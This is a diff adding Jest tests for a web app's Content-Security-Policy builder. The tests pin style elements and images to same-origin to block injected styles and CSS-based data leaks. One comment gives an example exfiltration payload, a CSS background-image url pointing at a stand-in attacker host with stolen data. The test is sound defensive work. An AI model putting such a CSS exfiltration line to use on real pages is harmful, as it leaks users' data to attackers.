@@ -41,6 +41,37 @@ describe('buildCsp', () => {
     expect(buildCsp('https://api.example.com')).toContain("base-uri 'self'");
   });
 
+  it('refuses injected <style> elements while keeping style attributes working', () => {
+    // No nonce or hash can cover a style attribute, and React style={{…}} and
+    // ag-grid both need them — but stylesheet *elements* can still be pinned
+    // to same-origin, so injected <style> blocks are refused.
+    const csp = buildCsp('https://api.example.com');
+
+    expect(csp).toContain("style-src-elem 'self'");
+    expect(csp).toContain("style-src-attr 'unsafe-inline'");
+  });
+
+  it('keeps a permissive style-src fallback so older browsers do not break', () => {
+    // A browser that does not know style-src-elem/-attr falls back to
+    // style-src. Without 'unsafe-inline' there, every style attribute would be
+    // dropped and the layout would collapse.
+    const csp = buildCsp('https://api.example.com');
+    const styleSrc = csp.split('; ').find((d) => d.startsWith('style-src '));
+
+    expect(styleSrc).toBe("style-src 'self' 'unsafe-inline'");
+  });
+
+  it('allows no remote image host, closing the CSS exfiltration sink', () => {
+    // Inline styles are only dangerous if CSS can reach the network —
+    // background-image: url(https://attacker/?stolen). Films ship poster: null
+    // and the client draws a gradient, so no remote host is needed.
+    const csp = buildCsp('https://api.example.com');
+    const imgSrc = csp.split('; ').find((d) => d.startsWith('img-src'));
+
+    expect(imgSrc).toBe("img-src 'self' data:");
+    expect(imgSrc).not.toContain('https:');
+  });
+
   it('drops connect-src to self alone when the API is same-origin', () => {
     const csp = buildCsp('');
 
